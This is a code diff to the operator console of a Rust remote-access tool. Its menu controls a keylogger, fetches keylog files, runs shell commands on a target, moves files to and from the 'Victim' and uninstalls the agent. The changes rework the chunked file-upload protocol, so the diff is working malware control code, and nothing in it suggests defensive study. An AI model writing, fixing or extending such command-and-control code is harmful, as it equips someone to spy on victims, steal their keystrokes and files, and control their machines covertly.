@@ -107,8 +107,8 @@ impl Commander {
         println!("2) Stop Keylogger");
         println!("3) Request Keylog File");
         println!("4) Run Shell Command");
-        println!("5) Upload File to Victim");
-        println!("6) Download File from Victim");
+        println!("5) Transfer File to Victim");
+        println!("6) Transfer File from Victim");
         println!("7) Uninstall Agent");
         println!("8) Disconnect");
         println!("0) Exit Commander");
@@ -381,18 +381,20 @@ impl Commander {
             }
         };
 
+        // Build metadata: path_len + path + file_size (as first FILE chunk)
         let mut metadata = Vec::new();
-        metadata.push(0x60);
-        metadata.push(remote_path.as_bytes().len() as u8);
-        metadata.extend_from_slice(remote_path.as_bytes());
-        metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());
+        metadata.push(remote_path.as_bytes().len() as u8);  // path_len
+        metadata.extend_from_slice(remote_path.as_bytes());  // path
+        metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());  // file_size
         
-        if self.send_packet(PACKET_TYPE_CMD, 0, &metadata).is_err() {
+        // Send metadata as FIRST file chunk (PACKET_TYPE_FILE)
+        if self.send_packet(PACKET_TYPE_FILE, 0, &metadata).is_err() {
             println!("[!] Failed to send metadata");
             return;
         }
         println!("[+] Metadata sent");
 
+        // Send file chunks
         let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
         for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
             print!("\r[*] Uploading chunk {}/{}...", i + 1, total_chunks);
@@ -405,6 +407,7 @@ impl Commander {
             thread::sleep(Duration::from_millis(50));
         }
 
+        // Send end marker
         self.send_packet(PACKET_TYPE_FILE, 0, &[0xFF]).ok();
         println!("\n[+] File upload complete!");
     }
